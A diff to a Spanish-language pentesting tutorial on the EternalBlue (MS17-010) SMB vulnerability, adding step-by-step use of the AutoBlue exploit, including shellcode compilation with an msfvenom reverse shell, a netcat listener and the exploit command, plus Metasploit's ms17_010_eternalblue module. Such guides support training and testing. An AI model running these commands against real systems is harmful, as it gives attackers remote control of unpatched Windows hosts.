@@ -26,8 +26,53 @@ Existen varias formas de aprovechar esta vulnerabilidad, tanto de forma manual c
 
 ### AutoBlue-MS17-010
 
+Para usar este exploit necesitamos clonar su [repositorio en github](https://github.com/3ndg4me/autoblue-ms17-010). Proporciona exploits para varias versiones de Windows, además de un scritp que comprueba si el sistema es vulnerable.
 
+El primer paso es entrar al directorio `shellcode` y ejecutar el script `shell_prep.sh`, que complilará el shellcode. Por ejemplo:
 
-### Metasploit:
+```
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y
+LHOST for reverse connection:
+<YOUR-IP>
+LPORT you want x64 to listen on:
+<SOME PORT>
+LPORT you want x86 to listen on:
+<SOME OTHER PORT>
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+0
+```
+
+Creamos un listener con `netcat`:
+
+```bash
+nc -nvlp 1234
+```
+
+Por último, para ejecutarlo:
+
+```bash
+python eternalblue_exploit7.py <IP> shellcode/sc_x64.bin
+```
+
+### Metasploit: ms17_010_eternalblue
+
+```bash
+msf > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts <IP>
+msf exploit(windows/smb/ms17_010_eternalblue) > exploit
+```
 
 [⟵ Anterior](../../05_sistema.md#explotación-windows)
